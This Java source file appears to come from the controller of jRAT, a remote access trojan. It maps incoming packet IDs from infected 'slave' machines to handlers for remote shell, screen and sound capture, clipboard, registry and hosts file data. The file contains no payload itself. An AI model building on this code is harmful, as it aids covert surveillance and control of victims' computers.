package se.jrat.controller.packets.incoming;

import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import se.jrat.common.PacketRange;
import se.jrat.controller.Slave;
import se.jrat.controller.addons.PluginEventHandler;


public class IncomingPackets {

	private static final Map<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	public static Map<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();
		
		incomingPackets.put((byte) 2, Packet2Status.class);
		incomingPackets.put((byte) 3, Packet3Initialized.class);
		incomingPackets.put((byte) 4, Packet4InitOperatingSystem.class);
		incomingPackets.put((byte) 5, Packet5InitUserHost.class);
		incomingPackets.put((byte) 6, Packet6InitVersion.class);
		incomingPackets.put((byte) 7, Packet7InitServerID.class); //
		incomingPackets.put((byte) 8, Packet8InitCountry.class);
		incomingPackets.put((byte) 9, Packet9InitJavaVersion.class);
		incomingPackets.put((byte) 10, Packet10InitInstallPath.class);
		incomingPackets.put((byte) 11, Packet11InitInstallationDate.class);
		incomingPackets.put((byte) 12, Packet12InitLocalAddress.class);
		incomingPackets.put((byte) 13, Packet13InitTotalMemory.class);
		incomingPackets.put((byte) 14, Packet14InitAvailableCores.class);
		incomingPackets.put((byte) 15, Packet15InitJavaPath.class);
		incomingPackets.put((byte) 16, Packet16LoadedPlugins.class);
		incomingPackets.put((byte) 17, Packet17InitDrives.class);
		incomingPackets.put((byte) 18, Packet18InitMonitors.class);	
		incomingPackets.put((byte) 19, Packet19InitCPU.class);
		//20
		incomingPackets.put((byte) 21, Packet21RemoteShell.class);
		incomingPackets.put((byte) 22, Packet22ListFiles.class);
		//23
		incomingPackets.put((byte) 24, Packet24UsedMemory.class);
		incomingPackets.put((byte) 25, Packet25Process.class);
		incomingPackets.put((byte) 26, Packet26RemoteScreen.class);
		incomingPackets.put((byte) 27, Packet27URLStatus.class);
		//28
		incomingPackets.put((byte) 29, Packet29ServerDownloadPart.class);		
		incomingPackets.put((byte) 30, Packet30BeginServerDownload.class);
		incomingPackets.put((byte) 31, Packet31CompleteServerDownload.class);
		//32
		incomingPackets.put((byte) 32, Packet32SystemProperties.class);
		incomingPackets.put((byte) 33, Packet33Thumbnail.class);
		incomingPackets.put((byte) 34, Packet34CustomDirectory.class);
		incomingPackets.put((byte) 35, Packet35ChatMessage.class);	
		//36
		incomingPackets.put((byte) 37, Packet37SearchResult.class);
		incomingPackets.put((byte) 38, Packet38HostFile.class);
		incomingPackets.put((byte) 39, Packet39HostEditResult.class);
		incomingPackets.put((byte) 40, Packet40UTorrentDownload.class);
		incomingPackets.put((byte) 41, Packet41Clipboard.class);
		incomingPackets.put((byte) 42, Packet42PreviewFile.class);
		incomingPackets.put((byte) 43, Packet43PreviewImage.class);
		incomingPackets.put((byte) 44, Packet44SystemJavaProperty.class);
		incomingPackets.put((byte) 45, Packet45ArchivePreview.class);
		incomingPackets.put((byte) 46, Packet46FileHash.class);
		// 48
		incomingPackets.put((byte) 49, Packet49LanDevices.class);
		incomingPackets.put((byte) 50, Packet50IPConfig.class);
		incomingPackets.put((byte) 51, Packet51ActivePort.class);
		incomingPackets.put((byte) 52, Packet52WindowsService.class);
		incomingPackets.put((byte) 53, Packet53RegistryStartup.class);
		incomingPackets.put((byte) 54, Packet54Registry.class);
		incomingPackets.put((byte) 55, Packet55InstalledProgram.class);
		incomingPackets.put((byte) 56, Packet56NetworkAdapter.class);
		//57
		incomingPackets.put((byte) 58, Packet58SoundCapture.class);
		incomingPackets.put((byte) 59, Packet59ThumbnailPreview.class);
		incomingPackets.put((byte) 60, Packet60Error.class);		
		//61
		//62
		//63
		//64
		incomingPackets.put((byte) 65, Packet65ErrorLog.class);
		incomingPackets.put((byte) 66, Packet66Config.class);
		//67
		incomingPackets.put((byte) 68, Packet68RemoteScreenComplete.class);	
		//69
		//70
		incomingPackets.put((byte) 71, Packet71AllThumbnails.class);
	}

	public static boolean execute(byte header, Slave slave) {
		try {
			AbstractIncomingPacket ac = null;
			Set<Byte> set = incomingPackets.keySet();

			for (Byte str : set) {
				if (str == header) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}

			if (ac != null && header >= 0 && header <= PacketRange.RANGE_INCOMING) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				PluginEventHandler.onPacket(slave, header);
			}

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}